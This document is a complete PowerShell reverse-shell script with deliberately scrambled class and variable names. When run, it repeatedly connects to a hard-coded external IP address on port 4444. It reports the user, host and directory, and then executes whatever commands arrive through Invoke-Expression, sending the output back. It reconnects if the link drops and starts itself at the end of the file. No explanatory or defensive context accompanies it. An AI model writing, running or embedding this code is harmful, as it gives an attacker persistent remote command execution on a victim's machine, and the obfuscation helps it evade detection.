class OioHYd {
    
    [string]$kZZorxIGOd = "93.49.240.195"
    [int]$rhsuGVCHXayC = 4444

    $EmLxYDSHi
    $JIUAPiRLwIPtdC
    $SwfmjNVPEubmfzYlmGBWbCy
    $SMmuuooxckWYzhu
    $JIWDkXgypaDX
    $zyCKZbruOCepBerlyJuDAy
    [int]$fOPkIacMykaV = 50*1024

    GJMinpQSwVyGUSlDL() {
        $this.JIUAPiRLwIPtdC = $false
        while ($true) {
            try {
                $this.JIUAPiRLwIPtdC = New-Object Net.Sockets.TcpClient($this.kZZorxIGOd, $this.rhsuGVCHXayC)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.DbtAakskugWumWXpuJBhLlS()
    }

    DbtAakskugWumWXpuJBhLlS() {
        $this.EmLxYDSHi = $this.JIUAPiRLwIPtdC.GetStream()
        $this.SMmuuooxckWYzhu = New-Object Byte[] $this.fOPkIacMykaV
        $this.zyCKZbruOCepBerlyJuDAy = New-Object Text.UTF8Encoding
        $this.SwfmjNVPEubmfzYlmGBWbCy = New-Object IO.StreamWriter($this.EmLxYDSHi, [Text.Encoding]::UTF8, $this.fOPkIacMykaV)
        $this.JIWDkXgypaDX = New-Object System.IO.StreamReader($this.EmLxYDSHi)
        $this.SwfmjNVPEubmfzYlmGBWbCy.AutoFlush = $true
    }

    KBqPkewkK() {
        $this.GJMinpQSwVyGUSlDL()
        $this.DazZaiAezNF()
    }

    TLfGJccAXoNPh($DpMcAAeeKahBkwpl) {
        try {
            [byte[]]$NkfEMbSoT = [text.Encoding]::Ascii.GetBytes($DpMcAAeeKahBkwpl)
            $this.SwfmjNVPEubmfzYlmGBWbCy.Write($NkfEMbSoT, 0, $NkfEMbSoT.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KBqPkewkK()
        }
    }

    [string] RUIAUzCmjiYbZyQ() {
        try {
            $dbhgDp = $this.EmLxYDSHi.Read($this.SMmuuooxckWYzhu, 0, $this.fOPkIacMykaV)    
            $wKDntYmcLVGscFEDxlxZxMj = ($this.zyCKZbruOCepBerlyJuDAy.GetString($this.SMmuuooxckWYzhu, 0, $dbhgDp))
            return $wKDntYmcLVGscFEDxlxZxMj
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KBqPkewkK()
            return ""
        }
    }

    [string] pzDZtDBdkNgAfDgLXhHYxrY($oqhrPdsVydF) {
        Write-Host $oqhrPdsVydF
        try { 
            $NATUxhvPD = Invoke-Expression $oqhrPdsVydF | Out-String
        }
        catch {
            $kvyyos = $_.Exception
            $ELZRkYnFdin = $_.Message
            $NATUxhvPD = "`n$_`n"
        }
        return $NATUxhvPD
    }

    [string] mOGTZ() {
        $zsvnmXg = [Environment]::UserName
        $ZShjLoAALaIVH = [System.Net.Dns]::GetHostName()
        $LfNdEKWkBBI = Get-Location
        return "$zsvnmXg@$ZShjLoAALaIVH [$LfNdEKWkBBI]~$ "
    }

    DazZaiAezNF() {
        while ($this.JIUAPiRLwIPtdC.Connected) {
            $this.TLfGJccAXoNPh($this.mOGTZ())         
            $wKDntYmcLVGscFEDxlxZxMj = $this.RUIAUzCmjiYbZyQ()
            $NATUxhvPD = "`n"
            if ([string]::IsNullOrEmpty($wKDntYmcLVGscFEDxlxZxMj)) {
                continue
            }
            $NATUxhvPD = $this.pzDZtDBdkNgAfDgLXhHYxrY($wKDntYmcLVGscFEDxlxZxMj)
            $this.TLfGJccAXoNPh($NATUxhvPD + "`n")
            $this.EmLxYDSHi.Flush()
        }
        $this.JIUAPiRLwIPtdC.Close()
        $this.KBqPkewkK()
    } 
}

$oBBtaSEEIBkFnIluGK = [OioHYd]::new()
$oBBtaSEEIBkFnIluGK.KBqPkewkK()
